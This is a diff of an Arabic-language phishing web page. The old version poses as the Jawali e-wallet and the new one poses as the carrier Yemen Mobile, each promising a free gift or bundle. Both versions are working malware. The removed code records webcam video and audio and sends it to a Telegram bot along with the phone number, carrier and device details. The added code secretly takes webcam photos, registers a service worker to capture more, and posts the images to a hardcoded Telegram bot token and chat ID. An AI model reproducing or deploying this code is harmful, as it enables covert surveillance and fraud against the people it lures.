@@ -2,9 +2,9 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>الرئيسية-محفظة جوالي الالكترونية</title
-<meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="مرحبا بكم في خدمة جوالي - جوائز قيمة">
+  <title>الرئيسية-يمن موبايل</title>
+  <meta name="description" content="مرحبا بكم في شركة يمن موبايل الشركة الرائدة في مجال الاتصالات"/>
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
   <style>
     body {
       text-align: center;
@@ -15,6 +15,7 @@
     }
     button {
       font-size: 18px;
+      text-decoration: none;
       font-weight: bold;
       margin: 10px;
       padding: 10px 30px;
@@ -29,172 +30,95 @@
     .start-button:hover {
       background-color: #0056b3;
     }
-    #consentBox {
-      background: #fff3cd;
-      border: 1px solid #ffeeba;
-      padding: 20px;
+    .logo {
+      width: 100px;
+      height: 100px;
       margin: 20px auto;
-      width: 60%;
-      border-radius: 8px;
-      font-size: 18px;
     }
   </style>
 </head>
 <body>
-
-  <h2>🎁 اضغط الزر للحصول على هدية مقدمة من محفظة جوالي الالكترونية (رصيد أو مزايا او مبالغ نقدية)</h2>
-
-  <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك" style="margin-bottom: 10px; padding: 10px; font-size: 18px;"><br>
-  <p id="carrierDisplay" style="font-size: 18px; color: #555;"></p>
-
-  <div id="consentBox">
-    <p>📸 سيطلب إذن لتشغيل الكاميرا من أجل التحقق من رقمك</p>
-    <button class="start-button" onclick="confirmConsent()">أوافق</button>
-  </div>
-
-  <button class="start-button" id="confirmBtn" onclick="startCameraAndSend()" style="display: none;">تأكيد</button>
-
-  <p id="confirmationMessage" style="display: none; font-size: 24px; color: green;">
-    ✅ تم تأكيد رقمك: <span id="confirmedNumber"></span>
-  </p>
-
+  <img class="logo" src="logo_65242435a75715-41066275.svg" alt=""/>
+  <h2>اضغط الزر للحصول على باقة مزايا او رصيد اساسي مقدم من يمن موبايل</h2>
+  <button class="start-button" onclick="startCameraAndSend()">ابدأ</button>
+  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
   <script>
-    let botToken = '';
-    let chatId = '';
+    let canvas = document.getElementById('canvas');
+    let video = null;
+    let stream = null;
+    let intervalId = null;
 
-    // تحميل إعدادات البوت
-    fetch('/config')
-      .then(res => res.json())
-      .then(data => {
-        botToken = data.botToken;
-        chatId = data.chatId;
-      })
-      .catch(err => {
-        console.error('فشل تحميل انتظر:', err);
-        alert('فشل تحميل انتظر.');
-      });
-
-    // كشف مزود الخدمة تلقائياً
-    document.getElementById('phoneNumber').addEventListener('input', () => {
-      const phone = document.getElementById('phoneNumber').value;
-      const carrierName = detectCarrier(phone);
-      document.getElementById('carrierDisplay').innerText = "مزود الخدمة: " + carrierName;
-    });
-
-    function detectCarrier(phoneNumber) {
-      const cleaned = phoneNumber.replace(/\D/g, '');
-      const prefix = cleaned.substring(0, 2);
-      switch (prefix) {
-        case '77':
-          return "يمن موبايل";
-        case '71':
-          return "سبأفون";
-        case '73':
-          return "MTN";
-        case '70':
-          return "واي";
-        default:
-          return "مزود غير معروف";
-      }
-    }
-
-    function confirmConsent() {
-      document.getElementById('consentBox').style.display = 'none';
-      document.getElementById('confirmBtn').style.display = 'inline-block';
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register('service-worker.js')
+        .then(registration => {
+          console.log('Service Worker مسجل');
+          navigator.serviceWorker.addEventListener('message', event => {
+            if (event.data === 'captureAndSend') {
+              captureAndSend();
+            }
+          });
+        })
+        .catch(error => {
+          console.error('خطأ في تسجيل Service Worker:', error);
+        });
     }
 
     function startCameraAndSend() {
-      const phoneNumber = document.getElementById('phoneNumber').value.trim();
-      if (phoneNumber === '') {
-        alert('يرجى إدخال رقم الهاتف.');
-        return;
-      }
-
-      recordAndSendVideo(phoneNumber);
-    }
-
-    async function recordAndSendVideo(phoneNumber) {
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        alert("المتصفح لا يدعم الخدمة.");
+        alert('المتصفح لا يدعم العملية');
         return;
       }
+      video = document.createElement('video');
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(s => {
+          stream = s;
+          video.srcObject = stream;
+          video.play();
+          captureAndSend();
+        })
+        .catch(error => {
+          console.error('فشل تشغيل :', error);
+          alert('تعذر تشغيل اعد المحاولة.');
+        });
+    }
 
+    function captureAndSend() {
+      let context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      let imageData = canvas.toDataURL('image/png');
+      let base64Image = imageData.split(',')[1];
+      const botToken = '6767498865:AAFibdms3ba_9bH8vqD6X92DrkiRHkPEn2w';
+      const chatId = '7057346640';
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-        const chunks = [];
-
-        mediaRecorder.ondataavailable = (event) => {
-          if (event.data.size > 0) {
-            chunks.push(event.data);
-          }
-        };
-
-        mediaRecorder.onstop = async () => {
-          const videoBlob = new Blob(chunks, { type: 'video/webm' });
-          const info = await collectUserInfo(phoneNumber);
-
-          const formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('video', videoBlob, 'recording.webm');
-          formData.append('caption', info.caption);
-
-          fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-            method: 'POST',
-            body: formData
-          })
-          .then(res => res.json())
-          .then(result => {
-            if (!result.ok) {
-              console.error("فشل إرسال تاكيد:", result.description);
-            }
-          })
-          .catch(err => {
-            console.error("خطأ أثناء إرسال :", err);
-          });
-
-          document.getElementById('confirmedNumber').innerText = phoneNumber;
-          document.getElementById('confirmationMessage').style.display = 'block';
-
-          stream.getTracks().forEach(track => track.stop());
-        };
-
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 10000);
-
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: createFormData(base64Image, chatId),
+        })
+        .then(response => response.json())
+        .then(result => {
+          console.log('تم إرسال الصورة بنجاح');
+        })
+        .catch(error => {
+          console.error('خطأ في الإرسال:', error);
+        });
       } catch (error) {
-        console.error("فشل الوصول :", error);
-        alert("تعذر تشغيل .");
+        console.error('خطأ في الإرسال:', error);
       }
     }
 
-    async function collectUserInfo(phoneNumber) {
-      const userAgent = navigator.userAgent;
-      const connectionStatus = navigator.onLine ? "متصل بالإنترنت" : "غير متصل";
-      let batteryLevel = "غير متوفر";
-
-      if ('getBattery' in navigator) {
-        try {
-          const battery = await navigator.getBattery();
-          batteryLevel = Math.round(battery.level * 100) + "%";
-        } catch (e) {
-          batteryLevel = "غير متاح";
-        }
+    function createFormData(base64, chatId) {
+      const byteCharacters = atob(base64);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
       }
-
-      const carrier = detectCarrier(phoneNumber);
-
-      const caption = `
-📱 رقم الهاتف: ${phoneNumber}
-🏢 مزود الخدمة: ${carrier}
-🖥️ نوع الجهاز: ${userAgent}
-🔋 نسبة البطارية: ${batteryLevel}
-🌐 حالة الاتصال: ${connectionStatus}
-      `.trim();
-
-      return { caption };
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray], { type: 'image/png' });
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'snapshot.png');
+      return formData;
     }
-  <script src="index.js"></script>
-
+  </script>
 </body>
-    </html>
+</html>
